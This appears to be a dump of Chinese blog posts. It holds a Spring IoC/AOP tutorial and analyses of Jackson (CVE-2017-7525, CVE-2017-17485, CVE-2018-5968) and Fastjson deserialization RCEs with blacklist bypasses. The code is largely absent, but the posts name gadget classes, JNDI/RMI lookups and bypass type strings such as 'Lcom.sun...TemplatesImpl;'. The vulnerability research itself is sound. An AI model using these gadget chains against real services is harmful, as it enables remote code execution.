IoC控制反转，它不是一门技术，而是一种设计思想，是一个重要的面向对象编程法则，能够指导我们如何设计出松耦合、更优良的程序。 什么是控制反转：在传统的Java应用中，要调用对象时，通常由调用者new出被调用者的对象；而在Spring框架中，是由IoC容器来创建对象的，然后再给调用者，就是所谓的“控制反转”。IoC好处在于解耦合。 依赖注入（DI）Denpendency Injection，在面向对象中，对象和对象之间是存在一种叫做“依赖”的关系。简单来说，依赖关系就是在一个对象中需要用到另外一个对象，即对象中存在一个属性，该属性是另外一个类的对象。 依赖注入本质上是 Spring Bean 属性注入的一种，只不过这个属性是一个对象属性而已。 IoC容器IoC 思想基于 IoC 容器实现的，IoC 容器底层其实就是一个 Bean 工厂。Spring 框架为我们提供了两种不同类型 IoC 容器，它们分别是 BeanFactory 和 ApplicationContext。 BeanFactory是 IoC 容器的基本实现，也是 Spring 提供的最简单的 IoC 容器，它提供了 IoC 容器最基本的功能，由 org.springframework.beans.factory.BeanFactory 接口定义。BeanFactory 采用懒加载（lazy-load）机制，容器在加载配置文件时并不会立刻创建 Java 对象，只有程序中获取（使用）这个对对象时才会创建。它属于Spring内部使用接口，通常情况下不提供给开发人员使用。 ApplicationContext 是 BeanFactory 接口的子接口，是对 BeanFactory 的扩展。ApplicationContext 在 BeanFactory 的基础上增加了许多企业级的功能，例如 AOP（面向切面编程）、国际化、事务支持等。 它有两个常用的实现类： ClassPathXmlApplicationContext，加载类路径 ClassPath 下指定的 XML 配置文件，并完成 ApplicationContext 的实例化工作； FileSystemXmlApplicationContext，加载指定的文件系统路径中指定的 XML 配置文件，并完成 ApplicationContext 的实例化工作。 IoC示例创建一个maven，在pom.xml中添加依赖，报错就刷新maven下载依赖包： （lombok依赖包可以免除写get、set方法） 传统方法获取对象：创建实体类Student.java： 手动new对象： 通过IoC创建对象：Address.java： Student.java： 在配置文件中添加需要管理的对象，对各个对象以及它们之间的依赖关系进行配置；XML格式的配置文件，文件名可自定义，建在resource目录下（new-&gt;XML Configuration File-&gt;Spring Config）； 配置文件中的&lt;bean&gt;标签中： id指对象名； class指对象的模板类（所有交给IoCL来管理的类必须有无参构造方法，因为Spring底层是通过反射机制来创建对象，调用的是无参构造方法） 对象的成员变量通过property标签来赋值： name，成员变量名 value，成员变量值（基本数据类型，String可以直接赋值，其他引用类型不能通过value赋值） ref，将IoC中的另一个bean赋给当前的成员变量（DI注入） IoC创建对象： 创建 ApplicationContext 对象时使用了 ClassPathXmlApplicationContext 类，这个类用于加载 Spring 配置文件、创建和初始化所有对象（Bean）。ApplicationContext.getBean()方法用来获取 Bean，该方法返回值类型为 Object，通过强制类型转换为 student 的实例对象。 运行结果：[1] 由于对象的基本信息、对象之间的依赖关系都是在配置文件中定义的，并没有在代码中紧密耦合，因此即使对象发生改变，我们也只需要在配置文件中进行修改即可，而无须对 Java 代码进行修改，这就是 Spring IoC 实现解耦的原理。 IoC底层实现实际上就是xml解析和反射获取对象的过程。pom.xml添加依赖： 通过调用无参构造函数创建对象：配置文件（ref指向的bean最好放在前面，好赋值一点）： 模拟一个接口MyApplicationContext，里面有获取bean的抽象方法： 创建MyClassPathXmlApplicationContext类实现MyApplicationContext接口，模拟IoC进行xml解析和反射获取对象的操作。 MyTest.java： 运行结果：[2] &#x3D;&#x3D;？如何使用有参构造方法创建对象：; 通过有参构造函数创建对象配置文件，使用&lt;constructor-arg&gt;标签： student类中添加有参构造函数： 给Bean注入集合：配置文件： 成员变量类型定义为List：private List&lt;Address&gt; address; scope作用域Spring管理的Bean是根据scope来生成的，表示Bean的作用域，Spring 5提供了6种。 singleton：默认值，单例模式，表示在Spring容器中只有一个Bean实例。 prototype：原型模式，表示每次通过 Spring 容器获取 Bean 时，容器都会创建一个新的 Bean 实例。 request ：每次 HTTP 请求，容器都会创建一个 Bean 实例。该作用域只在当前 HTTP Request 内有效。 session ：同一个 HTTP Session 共享一个 Bean 实例，不同的 Session 使用不同的 Bean 实例。该作用域仅在当前 HTTP Session 内有效。 application ：同一个 Web 应用共享一个 Bean 实例，该作用域在当前 ServletContext 内有效。 websocket ：websocket 的作用域是 WebSocket ，即在整个 WebSocket 中有效。request和session只适用于web项目，使用单例模式和原型模式的较多。 单例模式示例：在配置文件中，为bean添加scope=&quot;singleton&quot;； 在main方法中获取三个Bean，并进行比较： 返回结果为true；[3] 说明无论获取多少个Bean，实际上都是同一个，指向一个地址；单例模式下，当Spring加载配置文件时就会创建Bean，后无面论是否获取Bean（getBean），都不再创建新的bean； 缺点：当我们不需要获取Bean时就已经创建了Bean； 优点：只用创建一个Bean，节省空间。 原型模式示例：在配置文件中改为scope=&quot;prototype&quot;；同样获取三个Bean，结果为false；[4] 说明三个Bean实例都不一样，指向三个地址 。 原型模式下，当业务代码获取IoC容器中的bean时(调用getBean时)，Spring才去调用无参构造函数创建对应的bean； 缺点：每获取一个Bean就要创建一个对象，占用空间； 优点，只在需要使用Bean的时候才创建Bean。 Spring Bean继承Spring中Bean继承是对象层面的继承，子Bean可以继承父Bean的属性值和父Bean的配置数据，可以根据需要重写或添加配置信息；(Java继承是类层面的继承，子类可以继承父类的内部结构信息) 子Bean的类的属性要多于等于父Bean的类的属性，否则会报错。 示例：在配置文件中定义student2继承student1，并修改name属性值，添加了sex属性，其他属性不变； main方法中获取分别两个bean； 结果可以看到，除了修改的name属性，添加的sex属性，其他属性都继承了student1；[5] Spring 依赖依赖也是bean和bean之间的一种关系，配置依赖后，被依赖的bean一定是先创建，再创建依赖的bean。（A依赖于B，先创建B，再创建A） 默认情况下，在配置文件中写在前面的Bean先创建，后面的Bean后创建。添加depends-on=&quot;&quot;缺点依赖关系； 配置文件，student依赖于teacher： Teacher.java: Student.java： 结果是Teacher对象先创建，说明不论位置关系如何，被依赖的对象都是先创建。[6] Spring Bean属性注入属性注入就是将属性注入到Bean中的过程，这些属性既可以是普通型，也可以是对象（Bean）。 Spring 主要通过以下 2 种方式实现属性注入： 构造函数注入 setter 注入（又称设值注入） 前面也都已经演示过了；构造函数注入就是在配置文件中使用&lt;constructor-arg&gt;对属性进行赋值；seter注入就是使用&lt;property&gt;对属性进行赋值。 在通过构造函数或 setter 方法进行属性注入时，通常是在 &lt;bean&gt; 元素中嵌套 &lt;property&gt; 和&lt;constructor-arg&gt;元素来实现的。这种方式虽然结构清晰，但书写较繁琐。Spring提供了两种短命名空间，以简化xml配置： p命名空间： &lt;bean id=&quot;Bean 唯一标志符&quot; class=&quot;包名+类名&quot; p:普通属性=&quot;普通属性值&quot; p:对象属性-ref=&quot;对象的引用&quot;&gt; c命名空间： &lt;bean id=&quot;Bean 唯一标志符&quot; class=&quot;包名+类名&quot; c:普通属性=&quot;普通属性值&quot; c:对象属性-ref=&quot;对象的引用&quot;&gt; p命名空间使用p命名空间需要在配置文件的&lt;beans&gt;元素中导入如下XML约束：xmlns:p=&quot;; 在配置文件中给属性的赋值写成如下样子(xmlns:p..要写在xsl:sche..前面)： 使用 p 命名空间注入依赖时，必须注意以下 3 点： Java 类中必须有 setter 方法； Java 类中必须有无参构造器（类中不包含任何带参构造函数的情况，无参构造函数默认存在）； 在使用 p 命名空间实现属性注入前，XML 配置的 &lt;beans&gt; 元素内必须先导入 p 命名空间的 XML 约束。 c命名空间使用c命名空间需要在配置文件的&lt;beans&gt;元素中导入如下XML约束：xmlns:c=&quot;; 在配置文件中给属性的赋值写成如下样子： 使用 c 命名空间注入依赖时，必须注意以下 2 点： Java 类中必须包含对应的有参构造函数； 在使用 c 命名空间实现属性注入前，XML 配置的 &lt;beans&gt; 元素内必须先导入 c 命名空间的 XML 约束。 Spring的工厂方法IoC通过工程模式创建bean的方式有两种： 静态工厂方法 实例工厂方法 静态工厂方法示例spring-config.xml，在&lt;bean&gt;中添加factory-method=&quot;getCar&quot;： Car.java： 静态工厂方法，里面定义一个静态代码块： main方法获取car： 运行结果：[7] 当MyCar中加载配置文件进内存时，就执行了StaticCarFactory中的静态代码块，创建了Bean，当getBean时再拿出来使用。 实例工厂方法配置文件中配置两个&lt;bean&gt;，先创建实例工厂的对象，再通过实例工厂对象来创建Car对象；（实例工厂本身需要实例化，静态工厂不用） 给Map赋值就写在构造方法中： main方法中获取Car的Bean； Spring自动装配（Autowire）在Bean与Bean之间建立依赖关系的行为称为“装配”；IoC容器本身是并不能独自完成装配工作，需要我们主动将Bean放进去，并告诉它Bean之间的依赖关系，它才能按照我们的要求完成装配工作。手动通过配置&lt;property&gt;和&lt;constructor-arg&gt;来维护Bean之间的依赖关系会随着依赖关系的增加使代码越来越复杂和繁琐，而自动装配大大提高了开发效率。 Spring 的自动装配功能可以让 Spring 容器依据某种规则（自动装配的规则，有五种），为指定的 Bean 从应用的上下文（AppplicationContext 容器）中查找它所依赖的 Bean，并自动建立 Bean 之间的依赖关系。 Spring 框架式默认不支持自动装配的，要想使用自动装配，则需要对 Spring XML 配置文件中&lt;bean&gt;元素的 autowire 属性进行设置；&lt;bean id=&quot;&quot; class=&quot;&quot; autowire=&quot;自动装配规则&quot;&gt; 自动装配规则 byName 按名称自动装配。Spring 会根据的 Java 类中对象属性的名称，在整个应用的上下文 ApplicationContext（IoC 容器）中查找。若某个 Bean 的 id 或 name 属性值与这个对象属性的名称相同，则获取这个 Bean，并与当前的 Java 类 Bean 建立关联关系。 byType 按类型自动装配。Spring 会根据 Java 类中的对象属性的类型，在整个应用的上下文 ApplicationContext（IoC 容器）中查找。若某个 Bean 的 class 属性值与这个对象属性的类型相匹配，则获取这个 Bean，并与当前的 Java 类的 Bean 建立关联关系。 constructor 按类型自动装配。与 byType 模式相似，不同之处在与它应用于构造器参数（依赖项），如果在容器中没有找到与构造器参数类型一致的 Bean，那么将抛出异常。其实就是根据构造器参数的数据类型，进行 byType 模式的自动装配。 default 表示默认采用上一级元素 &lt;beans&gt;设置的自动装配规则（default-autowire）进行装配。 no 默认值，表示不使用自动装配Bean 的依赖关系必须通过 &lt;constructor-arg&gt;和 &lt;property&gt;元素的 ref 属性来定义。 示例：在配置文件中使用autowire将car注入到person中，替代ref； Person类中定义一个Car类型参数： main方法： 如果autowire=&quot;byName&quot;，则根据Person类中的Car类型的参数名car，在&lt;bean&gt;中寻找id为car的bean，如果找不到，则car参数值为null；如果autowire=&quot;byType&quot;，则根据Person类中的Car类型，在&lt;bean&gt;中寻找类型为Car的bean，不论名称是否相等，如果找不到则报错；如果存在多个Car类型的bean，会抛出异常——没有唯一的bean。 AOPAOP使对面向对象的一个补充，在运行时，动态的将代码切入到类的指定方法、指定位置上的编程思想就是面向切面编程。将不同方法的同一个位置抽象成一个切面，对该切面对象进行编程就是AOP。 AOP的优点: 降低模块之间的耦合度 使系统容易扩展 更好的代码复用 非业务代码更加集中，不分散，便于统一管理 业务代码更简洁纯粹，没有其他代码影响 动态代理 AOP示例Spring AOP的底层是通过动态代理为目标对象执行横向织入的；Spring 在运行期会为目标对象生成一个动态代理对象，并在代理对象中实现对目标对象的增强。 创建Maven工程，导入依赖包； 定义一个计算器接口： 写它的实现类，这个是需要被代理的类，里面的方法属于是业务方法： 定义一个处理器，需要用它来生成代理对象： main方法： 运行结果：[8] 把每个方法中重复的输出代码，整合到invoke方法中，简化代码，这就是AOP； 实现原理就是动态代理的知识，当调用被代理类的方法的时候，会自动调用handler中的invoke方法，所以每调用一次计算方法，就调用一次invoke方法，进行一次输出。 Spring AOP示例Spring框架对AOP进行了封装，使用Spring框架可以用面向爱对象的思想来实现AOP；Spring框架中不需要创建Invocationhandler，只需要创建一个切面对象，将所有的非业务代码在切面对象中完成，Spring框架底层会自动根据切面类以及目标类生成一个代理对象。 定义切面类，在里面添加如下注解：@Aspect注解表示该类是切面类；@Component注解表示将该类的对象注入到IoC容器中；@Before注解表示方法执行的时机，在关联类中的方法执行前执行该方法，将before()方法与CalcImpl类中的方法位置关联起来；@After注解表示在关联类中的方法执行后、返回前执行该方法；@AfterReturning注解表示在关联类的方法返回后执行该方法，第二个参数表示返回的参数，这里的名字不一定要和关联类中方法的返回参数的名字相同，但是必须和该方法的形参名一致；@AfterThrowing注解表示在关联类的方法出现异常是执行该方法。 JoinPoint是连接点，可以实现方法调用，实际上也是通过反射调用。 CalcImpl中也添加@Component注解，将它交给IoC容器来管理；该注解就相当于在配置文件中写了一个&lt;bean&gt;，id默认是类名calcImpl(首字母小写)，也可自定义名称@Component(&quot;calc&quot;)：&lt;bean id=&quot;calcImpl&quot; class=&quot;AOP.CalcImpl&quot;&gt;&lt;/bean&gt; 将切面类交给IoC管理，一是需要添加@Component注解，二是需要Spring框架来扫描该类；在配置文件中添加一个自动扫描context:component-scan，它会到base-package中的类去扫描，如果扫描到添加了@Component注解，就把这个类交给IoC容器，让IoC来管理它的对象；aop:aspectj-autoproxy让Spring框架结合切面类和目标类自动生成动态代理对象。（相当于当Spring自动实现handler的功能） 配置文件如下： main方法，加载配置文件，生成代理对象： 运行结果：[9] 切面:横切关注点被模块化的抽象对象。 通知:切面对象完成的工，即非业务代码。 目标:被通知的对象，即被横切的对象。 代理:切面、通知、目标混合之后的对象。 连接点:通知要插入业务代码的具体位置。 切点: AOP通过切点定位到连接点。 "},{"title":"Jackson 反序列化 RCE","date":"2022-09-19T11:31:58.000Z","url":"/2022/09/19/Jackson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20RCE/","categories":[[" ",""]],"content":"CVE-2017-7525影响版本 Jackson 2.6系列 &lt; 2.6.7.1 Jackson 2.7系列 &lt; 2.7.9.1 Jackson 2.8系列 &lt; 2.8.8.1 环境搭建我用的是 JDK 8u20，对 JDK 的版本要求比较不确定，网上大部分人用 7u21 能复现，但是我的不行，得自己多试试。 导入依赖： 漏洞复现（TemplatesImpl 链）这里直接贴 POC，和 Fastjson 的 TemplatesImpl 链差不多，直接看能看懂。 构造一个恶意类，继承 AbstractTranslet（在 Fastjson 里说过原因）； 将恶意类的字节码进行 base64 编码； 定义一个实体类，其中包含一个Object属性； 使用com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类构造 POC；在 User 类的object属性中指明该属性类的全类名，并且给其相应的变量赋值，transletBytecodes是恶意类的字节码进行 base64 编码后的值；设置 DefaultTyping 为默认值，即 OBJECT_AND_NON_CONCRETE； 运行成功： 不开启 DefaultTyping 的话只会将 JSON 数据当作普通字符串来解析，并不会触发object属性值里的恶意代码； POC 调试跟进ObjectMapper.readValue() ； 分别跟进，JsonFactory.createParser()，封装了要反序列化的 JSON 数据，返回一个ReaderBasedJsonParser类对象； 跟进TypeFactory.constructType()，获取到的是entity.User类； 然后跟进 ObjectMapper._readMapAndClose()，各变量的值如图所示； 跟进BeanDeserializer.deserialize()，进入 if 语句； 跟进vanillaDeserialize()，调用StdValueInstantiator.createUsingDefault()方法根据构造方法实例化了一个 User 对象，各属性值都为 null ； 跟进MethodProperty.deserializeAndSet()，调用了SettableBeanProperty.deserialize() -&gt; StringDeserializer.deserialize()方法，将name的值取了出来，然后调用 setter方法将值赋给前面生成的 User 对象； 循环调用deserializeAndSet()方法，把每一个属性的值都取出来赋给 User 对象；直到获取object的值，this._valueTypeDeserializer的值不为 null ，调用UntypedObjectDeserializer.deserializeWithType(); 继续调用AsArrayTypeDeserializer.deserializeTypedFromAny() -&gt; _deserialize()，获取到对应TemplatesImpl类的 deser 是BeanDeserializer类型； 调用BeanDeserializer.deserialize() -&gt; vanillaDeserialize() -&gt; MethodProperty.deserializeAndSet()，和前面一样，将 JSON 数据中 TemplatesImpl 的值去除赋给TemplatesImpl 对象； 当取到outputProperties变量时，跟进到SetterlessProperty.deserializeAndSet()，调用的是getter方法； 这里为什么调用deserializeAndSet()的类不一样，是因为outputProperties变量对应的类不一样； 继续，一直跟进到TemplatesImpl.defineTransletClasses()，和 Fastjson 一样，在这里将传入的字节码转换为了 Java 对象； 然后在getTransletInstance()实例化该对象，触发命令执行。 调用链如下： 可以看到在defineTransletClasses()的 332 行中，和之前分析的 Fastjson 有点不一样；之前是这样的，区别在于有无_tfactory参数： 这是因为 JDK 版本不同，如果使用 8u112 版本，把_tfactory参数添加到 POC 里_tfactory:&#123; &#125;，会报错； 这个错误是 jackson-databind 报的，说明它不支持这个参数，所以只能选择没有_tfactory参数的 JDK 版本进行利用。 参考链接： CVE-2017-17485补丁分析jackson-databind 2.7.9.1 版本中，在获取typeId对应的 Deserializer 类型时，对传入的类做了黑名单校验； 一直到BeanDeserializerFactory.createBeanDeserializer()中，调用了 checkIllegalTypes()方法（注意看调用链）； 跟进checkIllegalTypes()，获取了传入类的全类名，然后在黑名单中对比； 可以看到com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl以及被加入到了黑名单中，所以无法在利用了。 补丁绕过在开启enableDefaultTyping()的情况下，利用org.springframework.context.support.ClassPathXmlApplicationContext来加载远程指定的 XML 配置文件，在配置文件中定义一个 bean ，bean 中通过使用 Spring EL 表达式来调用java.lang.ProcessBuilder的start()方法来执行命令。 导入依赖： 构造 bean 文件 spel.xml： 启一个 web 服务，把 bean 文件放到能访问的 web 目录下：python -m http.server 8081 构造 POC ，把object 属性赋值为org.springframework.context.support.ClassPathXmlApplicationContext： 运行成功： 影响版本 Jackson-databind version 2.9.3 Jackson-databind version 2.7.9.1 Jackson-databind version 2.8.10 POC 调试跟进获取object属性值时的BeanDeserializer.vanillaDeserialize()； 能成功绕过黑名单，一直到AnnotatedConstructor.call1()，调用ClassPathXmlApplicationContext的构造函数，以为参数实例化了一个对象； 这一步就是 Spring 加载配置文件、创建和初始化 bean 的步骤了。 继续跟跟看，跟进构造方法； 调用setConfigLocations()，对远程地址进行解析； 而后 new 了一个 StandardEnvironment； 它是 AbstractEnvironment 的子类，作用是获取和设置应用程序的属性和环境； 最后 refresh 一下，触发命令执行。 调用链如下： 参考链接： c3p0利用使用com.mchange.v2.c3p0.JndiRefForwardingDataSource，通过 JNDI+ RMI 进行利用。服务端代码： 客户端代码： 运行成功： 这里调用jndiName的 set 方法，把rmi://127.0.0.1:1099/calc赋给它； 然后调用到loginTimeout的 set 方法； 跟进setLoginTimeout() -&gt; inner()； 跟进JndiRefForwardingDataSource.dereference()，调用到lookup()，触发命令执行。 调用链如下： CVE-2018-5968补丁分析 2.7.9.2 版本中，使用了validateSubType()方法对传入的类进行黑名单校验； 虽然org.springframework.context.support.ClassPathXmlApplicationContext不在黑名单中，但是专门对org.springframework.开头的类进行了判断； 然后循环获取它的父类，再在 if 中进行对比，若父类为AbstractPointcutAdvisor或AbstractApplicationContext，则跳出循环，抛出异常。 同时也把 c3p0 可利用的类加入了黑名单； 补丁绕过寻找黑名单中没有的、可利用的类，可以使用org.apache.ibatis.datasource.jndi.JndiDataSourceFactory，通过 JNDI + LDAP 的方式进行利用。 漏洞触发点在JndiDataSourceFactory.setProperties()中，if 分支和 else if 分支都使用了 lookup，满足其中一个分支就可以了； 这里我根据 else if 分支来构造 POC，也就是说如果properties参数里面包含data_source，就进入else if；那么就向properties参数中传入一个 键为data_source，值为远程恶意类地址 的值，当反序列化时调用到setProperties()，进入 else if 分支，检索指定的远程对象，导致RCE。 导入依赖： 启一个 Web 服务，上传命令执行类的 class 文件； 服务端代码编写（参考marshalsec）： 客户端代码编写，需要开启 DefaultTyping； 运行成功： 影响版本2.8.11和2.9.x至2.9.3 POC 调试能成功绕过黑名单检测； 递归获取到properties参数； 跟进到MapDeserializer.deserialize()，获取到properties参数类型是 Properties ； 调用_readAndBindStringMap()进行参数绑定，获取到参数名data_source；调用StringDeserializer.deserialize()获取参数值，最后将参数值赋给data_source； 回到deserializeAndSet()，调用properties的 set 方法； 最后调用lookup()触发命令执行。 调用链如下： 参考链接："},{"title":"Jackson 简单学习","date":"2022-09-19T11:31:57.000Z","url":"/2022/09/19/Jackson%20%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/","categories":[[" ",""]],"content":"前言Jackson是一个开源的Java序列化和反序列化工具，可以将Java对象序列化为XML或JSON格式的字符串，以及将XML或JSON格式的字符串反序列化为Java对象。 需要在工程中导入依赖： 最常用的 API 是基于“对象绑定”的 ObjectMapper，其中包含多个序列化和反序列化的方法。 序列化可以通过ObjectMapper类中writeValuexxx方法将 Java 对象序列化为 JSON 数据，以不同的格式存储； writeValueAsString(Object value) 方法，将对象存储成字符串 writeValueAsBytes(Object value) 方法，将对象存储成字节数组 writeValue(File resultFile, Object value) 方法，将对象存储成文件 定义一个实体类，city变量没有 get 方法： 将 Java 对象序列化为 JSON字符串： 运行结果： 可以看到，调用了setCity()，但是在序列化的结果中并没有city属性，因为它没有设置 get 方法。 反序列化可以通过ObjectMapper类中readValue()方法，将不同类型的 JSON 数据反序列化为 Java 对象； readValue(String content, Class&lt;T&gt; valueType) 方法，将字符串反序列化为 Java 对象 readValue(byte[] src, Class&lt;T&gt; valueType) 方法，将字节数组反序列化为 Java 对象 readValue(File src, Class&lt;T&gt; valueType) 方法，将文件反序列化为 Java 对象 反序列化示例： 运行结果，city输出能够被反序列化： Jackson 多态类型的反序列化在反序列化时，只知道反序列化的类的类型，但是不知道这个类中各个属性是什么类型，可能是 Object类型，也可能是 interface 类型，那么如何知道反序列化的类的属性是什么类型呢？ 这就是由 JacksonPolymorphicDeserialization 机制来解决这个问题。 将属性具体类型信息序列化到 JSON 数据中的方法有两种： 设置 DefaultTyping 使用 @JsonTypeInfo 注解 DefaultTypingJackson 中提供了一个 DefaultTyping 属性，其中包含四个值： 通过enableDefaultTyping()方法来设置属性值。 JAVA_LANG_OBJECT当类里的属性声明为一个 Object 时，会对该属性进行序列化和反序列化，并且明确规定类名。 在实体类中设置一个Object类型的成员变量； 设置 DefaultTyping 为 JAVA_LANG_OBJECT，给object变量赋值为People对象； People 类，需要有无参构造； 运行结果： 可以看到，设置了 DefaultTyping 的序列化结果会输出该属性的类型，反序列化的结果中也还原了属性类型。 OBJECT_AND_NON_CONCRETE这是enableDefaultTyping()的默认值。当类里有 Interface 、 AbstractClass 类型属性时，会对其进行序列化和反序列化。 定义一个接口及其实现类： 在 User 类中添加上该属性： 设置 DefaultTyping 为 OBJECT_AND_NON_CONCRETE，运行结果可以看到将接口类型的属性也进行了序列化： NON_CONCRETE_AND_ARRAYS支持数组类型的属性序列化和反序列化。 给object赋值为 People 数组类型： 运行结果： NON_FINAL支持除 final 属性外的所有类型序列化和反序列化。 运行结果： 将数组中每个对象的类型都列了出来。 @JsonTypeInfo 注解@JsonTypeInfo 注解是Jackson多态类型绑定的一种方式，支持下面5种类型的取值： @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.NONE) @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.CLASS) @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.MINIMAL_CLASS) @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.NAME) @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.COSTOM) JsonTypeInfo.Id.NONE在实体类的object属性上添加该注解： 运行结果如下，与不添加该注解没区别： JsonTypeInfo.Id.CLASS在实体类的object属性上添加该注解： 运行结果如下： 在序列化的结果中，object属性中多了一个@class字段，指明了该属性类型的全类名；反序列化时能够成功将object的值按照entity.People类转换为 People 对象。 JsonTypeInfo.Id.MINIMAL_CLASS在实体类的object属性上添加该注解：@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS) 运行结果如下： 效果和 JsonTypeInfo.Id.CLASS 一样，只是用@c代替了@class。 JsonTypeInfo.Id.NAME在实体类的object属性上添加该注解：@JsonTypeInfo(use = JsonTypeInfo.Id.NAME) 运行结果如下： 序列化结果中多了一个@type字段，指明了类名；但是反序列化时出现了报错，因为@type字段只指明了类名，没指明包名，反序列化无法找到具体是那个包下 People 类，所以反序列化失败。 JsonTypeInfo.Id.CUSTOM在实体类的object属性上添加该注解：@JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM) 这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常： 总结当 JSON 字符串中指明了反序列化属性的全类名时，就可以将 JSON 数据反序列化为对应对象。 在下列设置的情况下进行序列化生成的 JSON 数据，指明了属性的全类名： enableDefaultTyping() @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.CLASS) @JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.MINIMAL_CLASS) 和 Fastjson 一样，在序列化、反序列化时会调用对应方法的 get、set 方法，包括Object属性对应类的 get、set 方法： 也就是说，如果反序列化的类及其属性类的 get、set 方法中存在可控参数，就可以通过构造恶意的 JSON 数据来利用。 参考链接："},{"title":"Fastjson 反序列化RCE","date":"2022-09-19T11:31:56.000Z","url":"/2022/09/19/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20RCE/","categories":[[" ",""]],"content":"Fastjson &lt;&#x3D; 1.2.41补丁分析从 1.2.25 版本开始，在黑名单中添加了许多禁止反序列化的包名，并且新增了checkAutoType()方法来对反序列化的类型进行判断。 代码对比： 1.2.24版本：在DefaultJSONParser.parserObject()中，276行加载了@type指定的类，318行调用getDeserializer()； 在ParserConfig.getDeserializer()中对加载的类进行了黑名单校验，黑名单中只有java.lang.Thread，程序能够继续执行。 1.2.25 版本：在DefaultJSONParser.parserObject()中，276行调用了checkAutoType()对获取到的@type字符串进行校验； 727行会先从mapping中去找有没有传入的类，这里是没有的，clazz为 null；autoTypeSupport默认为false，进入循环检测，这里的denyList里面添加了许多包名，包括我们前面使用的 TemplatesImpl 和 JdbcRowSetImpl，都属于com.sun，所以在这里就会报异常。 补丁绕过主要就是要绕过checkAutoType()检测。 首先，想要绕过黑名单检测，就得构造类名不在黑名单内，比如随便在类名上添加点字母符号之类的；然后，还得能加载这个类，有loadClass()的地方有这三个； 有两个是在对acceptList[]的循环中，acceptList[]这个数组本来就没有元素，所以根本不会进入 for 循环；那么就只剩第三个，需要满足的条件要么autoTypeSupport为 true，要么expectClass不为 null；可是expectClass本来传入的就是 null，改不了；所以只能通过修改autoTypeSupport属性为 true 来进入 if 语句； 跟进TypeUtils.loadClass()看看，clazz肯定是为 null 的，两个else if 中都调用了loadClass()； 第一个else if 中，判断了是否以[开头，尝试在类名前添加[，出现报错，说在 71 的位置希望有个[； 那就在 71 的位置添加上[再看，又说在 72 的位置希望有个&#123;； 那就继续添加&#123;，最后能成功执行命令。 在第二个 else if 中，判断了类名是否以L开头和;结尾，如果是，就把这两个字符去掉，形成新的类名，再加载。 所以，绕过补丁只需要两个条件： autoTypeSupport为 true 在类名对应位置添加指定字符 或 类名以L开头，以;结尾 POC 调试这里我就用 TemplatesImpl 链做演示，原理都一样；第一种绕过方式构造 POC 如下: 断点调试，只贴关键部分； 调用checkAutoType()； 能成功绕过黑名单检测； 进入loadClass()，实例化了一个Array类型，返回一个如图的 clazz； 返回ObjectArrayCodec类型的对象； 150 行去除了类名前后的字符，下面进入parseArray()； 一直跟到ParserConfig.getDeserializer()，因为clazz已经是正常类，所以进入 410 行，后续就和之前的分析一样。 第二种绕过方式构造@type如下：&quot;\\&quot;@type\\&quot;:\\&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\\&quot;,&quot; 调用checkAutoType()； 跟进checkAutoType()，能成功绕过黑名单检测； 跟进loadClass()，生成新的、存在的类名，再调用一次loadClass()； 然后正常加载并返回TemplatesImpl类； 成功获取到TemplatesImpl类后，正常进行后续的实例化恶意类操作。 1.2.43 之前的版本都是针对第二种绕过方式的修复，第一种绕过方式仍然可以使用。 Fastjson &lt;&#x3D; 1.2.42补丁分析在 1.2.42 的checkAutoType()中，把黑名单校验改成了 hash 值进行校验； 计算逻辑不算太难理解： 这里有更多类、包对应的 hash： 先用上一个 POC 调试看看； 发现 796 行把全类名前后的L和;去掉了；然后再取新类名的前三个字符进行计算，然后在 805 行的 for 循环中每次取后面一个字符进行 计算；白名单acceptHashCodes依旧为空，在 815 行判断这时的 hash 值是否在黑名单中，&gt;=0表示存在，第二个逻辑判断恒为真；循环到i=7，也就是已经将com.sun.进行了 hash 计算，这个时候得到 hash 值为 4147696707147271408，在黑名单中存在，所以在这里会报异常。 补丁绕过要绕过黑名单，也就是要让在去除L和;后的类名也不在黑名单中；发现去除L和;的操作只会进行一次，并没有循环去除，尝试双写进行绕过。 POC 调试修改@type值为LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;，其余不变； 能成功走出黑名单检测，来到TypeUtils.loadClass()； 这里会调用两次loadClass()来去除类名前后的字符； 最后再加载。 Fastjson &lt;&#x3D; 1.2.43补丁分析在 1.2.43 的checkAutoType()中，对多写的LL和;;进行了判断，如果出现，会报异常； 补丁绕过那么通过添加LL和;;就行不通了，不过还可以用上面Fastjson &lt;= 1.2.41中提到的第一种绕过方式进行绕过。 Fastjson &lt;&#x3D; 1.2.45补丁分析从 1.2.44 开始，在checkAutoType()中判断了全类名第一个字符是否是[，和首尾字符是否是L和;； 这下将两种绕过方式都限制了，只有另外找一条利用链。 补丁绕过寻找到一个黑名单中没有的类：org.apache.ibatis.datasource.jndi.JndiDataSourceFactory通过 JNDI + LDAP 的方式进行利用。 前提需要目标服务器存在 3.x.x-3.5.0的 mybatis jar包。 构造 POC先看一下JndiDataSourceFactory类的方法和成员变量； 漏洞触发点在JndiDataSourceFactory.setProperties()中，if 分支和 else if 分支都使用了 lookup，满足其中一个分支就可以了； 这里我根据 else if 分支来构造 POC，也就是说如果properties参数里面包含data_source，就进入else if；那么就向properties参数中传入一个 键为data_source，值为远程恶意类地址 的值，当反序列化时调用到setProperties()，进入 else if 分支，检索指定的远程对象，导致RCE。autoTypeSupport仍然要设为 true。 同样启一个 Web 服务，上传命令执行类的 class 文件； 导入依赖： 服务端代码编写（参考marshalsec）： 客户端代码编写： POC 调试调用过程都差不多，在DefaultJSONParser.parseObject() 298 行进入checkAutoType()，能成功绕过校验； 